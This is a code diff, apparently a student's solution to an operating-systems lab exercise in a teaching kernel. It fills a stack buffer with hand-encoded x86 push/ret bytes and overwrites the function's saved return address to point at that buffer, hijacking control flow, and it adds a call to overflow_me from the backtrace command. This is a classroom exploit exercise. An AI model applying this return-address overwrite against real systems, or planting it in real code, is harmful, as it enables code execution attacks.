@@ -85,9 +85,31 @@ start_overflow(void)
     // hint: You can use the read_pretaddr function to retrieve 
     //       the pointer to the function call return address;
 
-    char str[256] = {};
+    char str[256] ={};
+    str[0] = 0x68;
+    str[1] = 0x4f;
+    str[2] = 0x09;
+    str[3] = 0x10;
+    str[4] = 0xf0;
+    str[5] = 0x68;
+    str[6] = 0xa8;
+    str[7] = 0x0d;
+    str[8] = 0x11;
+    str[9] = 0xf0;	
+    str[10] = 0x68;
+    str[11] = 0x7f;
+    str[12] = 0x08;
+    str[13] = 0x10;
+    str[14] = 0xf0;
+    str[15] = 0xc3;
+    str[16] = 0x00;
     int nstr = 0;
     char *pret_addr;
+    uint32_t add;
+    add = read_pretaddr();
+    cprintf("retaddr %s\n",str);
+    *( uint32_t*)add = ( uint32_t)(str);
+    //cprintf("retaddr %08x\n",*(int*)add);
 
 	// Your code here.
     
@@ -117,6 +139,8 @@ mon_backtrace(int argc, char **argv, struct Trapframe *tf)
 	ebp = (uint32_t*)(*ebp);
     }
 
+    overflow_me();
+    cprintf("Backtrace success\n");
     return 0;
 }
 
